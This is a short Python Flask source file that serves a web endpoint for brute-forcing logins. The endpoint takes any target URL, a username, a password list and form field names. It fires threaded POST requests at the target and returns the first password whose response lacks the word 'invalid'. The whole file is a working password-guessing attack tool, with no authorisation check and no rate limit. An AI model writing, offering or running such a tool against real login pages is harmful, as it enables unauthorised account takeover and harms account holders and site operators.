from flask import Flask, request, jsonify
import requests
import concurrent.futures

app = Flask(__name__)

def try_login(target_url, username, password, field_map):
    data = {field_map['username']: username, field_map['password']: password}
    response = requests.post(target_url, data=data)
    if "invalid" not in response.text.lower():
        return password
    return None

@app.route("/brute", methods=["POST"])
def brute_force():
    req = request.json
    target_url = req["target_url"]
    username = req["username"]
    password_list = req["passwords"]
    field_map = req["form_fields"]

    found = None
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(try_login, target_url, username, pw, field_map): pw for pw in password_list}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                found = result
                break

    return jsonify({"success": bool(found), "password": found})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5002)
